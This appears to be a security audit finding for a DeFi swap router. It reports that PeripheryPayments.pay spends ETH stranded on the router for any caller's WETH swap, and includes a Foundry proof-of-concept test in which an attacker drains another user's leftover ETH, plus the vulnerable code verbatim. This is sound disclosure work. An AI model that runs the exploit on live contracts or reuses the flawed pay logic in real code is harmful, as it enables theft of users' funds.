### Title
Stranded Router ETH Consumed by Unprivileged WETH Swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay` contains a WETH branch that, when the router holds a native ETH balance `>= value`, wraps that ETH and forwards it to the pool **without ever touching the caller's WETH allowance**. Any ETH left on the router by a prior user (via excess `msg.value` without a `refundETH()` call) can be silently consumed by any subsequent attacker who calls `exactInputSingle` with `tokenIn=WETH`, `msg.value=0`, and zero WETH approval.

---

### Finding Description

**Step 1 — ETH stranding (precondition)**

`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`, and `multicall` are all `payable`. A user who sends `msg.value > amountIn` in a WETH-input swap without appending a `refundETH()` call leaves the surplus ETH on the router. The `receive()` guard only blocks *direct* ETH pushes; it does not prevent ETH from accumulating via `msg.value` in function calls. [1](#0-0) 

**Step 2 — Attacker entry**

Attacker calls `exactInputSingle(tokenIn=WETH, amountIn=V, msg.value=0)` with zero WETH approval. The router stores `payer = msg.sender` (attacker) and `tokenToPay = WETH` in transient storage, then calls `pool.swap(...)`. [2](#0-1) 

**Step 3 — Callback**

The pool calls back `metricOmmSwapCallback`, which dispatches to `_justPayCallback`: [3](#0-2) 

This calls `pay(WETH, attacker, pool, V)`.

**Step 4 — The vulnerable branch**

Inside `pay`, because `token == WETH` and `payer != address(this)`, execution enters the WETH branch. If `address(this).balance >= V` (the stranded ETH from user A), the router wraps its own ETH and transfers the resulting WETH to the pool. **The attacker's WETH balance and approval are never consulted.** [4](#0-3) 

The attacker receives the swap output token; user A's stranded ETH is permanently consumed.

---

### Impact Explanation

Direct, irreversible loss of user principal. Any ETH left on the router — a routine outcome of sending excess `msg.value` without `refundETH()` — is freely claimable by any address that calls a WETH-input swap with `amountIn` equal to the stranded balance. The attacker pays nothing and receives real swap output. Severity: **High**.

---

### Likelihood Explanation

The Uniswap v3 multicall pattern (send ETH, swap, refundETH) is the documented usage model for this router. Omitting `refundETH()` is a common user mistake and is also exploitable by a front-running attacker who observes a pending multicall that sends excess ETH. No special permissions, no malicious pool, no non-standard tokens required. Likelihood: **Medium–High**.

---

### Recommendation

In the `nativeBalance >= value` and `nativeBalance > 0` branches of `pay`, only use native ETH that was explicitly sent by the *current* caller (i.e., `msg.value` of the current top-level call). One safe approach: track how much ETH the current call is authorised to spend (e.g., store `msg.value` in a transient slot at entry and deduct from it in `pay`), and fall through to `safeTransferFrom` for any shortfall. Alternatively, never use the router's ambient ETH balance for a non-`address(this)` payer; always pull WETH from the payer via `safeTransferFrom` when `payer != address(this)` and `msg.value == 0`. [5](#0-4)

pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "contracts/MetricOmmSimpleRouter.sol";
import {IMetricOmmSimpleRouter} from "contracts/interfaces/IMetricOmmSimpleRouter.sol";
// ... (standard test setup from SimpleRouterTestBase)

function test_strandedEthStolenByAttacker() public {
    uint128 V = 2_500;

    // User A sends 2*V ETH but only swaps V, forgets refundETH — V ETH stranded
    vm.prank(userA);
    router.exactInputSingle{value: 2 * V}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: V,
            amountOutMinimum: 0,
            recipient: userA,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    assertEq(address(router).balance, V, "V ETH stranded");

    // Attacker: msg.value=0, zero WETH approval, amountIn=V
    address attacker = makeAddr("attacker");
    uint256 attackerToken1Before = token1.balanceOf(attacker);

    vm.prank(attacker);
    // No vm.deal, no weth.approve — attacker has nothing
    uint256 out = router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: V,
            amountOutMinimum: 0,
            recipient: attacker,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // Attacker received swap output funded entirely by user A's stranded ETH
    assertGt(out, 0, "attacker received output");
    assertGt(token1.balanceOf(attacker) - attackerToken1Before, 0, "attacker token1");
    assertEq(address(router).balance, 0, "router ETH drained");
}

  function pay(address token, address payer, address recipient, uint256 value) internal {
    // If the payer is contract it means we are in the middle of a path. In the middle of a path we operate on ERC20 only.
    if (payer == address(this)) {
      IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
  }
